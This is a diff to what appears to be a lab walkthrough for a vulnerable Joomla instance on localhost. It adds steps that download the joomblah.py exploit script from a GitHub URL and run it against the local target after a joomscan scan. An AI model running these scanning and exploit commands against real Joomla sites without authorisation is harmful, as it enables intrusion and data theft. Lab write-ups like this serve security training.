@@ -39,9 +39,15 @@ Scanning WebApp
 ```
 perl joomscan.pl -u http://127.0.0.1:8080
 ```
-
+Download JoomBlah
 ```
-
+https://raw.githubusercontent.com/thiagosmith/joomla-3.7.0/refs/heads/main/joomblah.py
 ```
-
+Execute JoomBlah
+```
+python2 joomblah.py
+```
+Target Exploiting
+```
+python2 joomblah.py http://127.0.0.1:8080
 ```
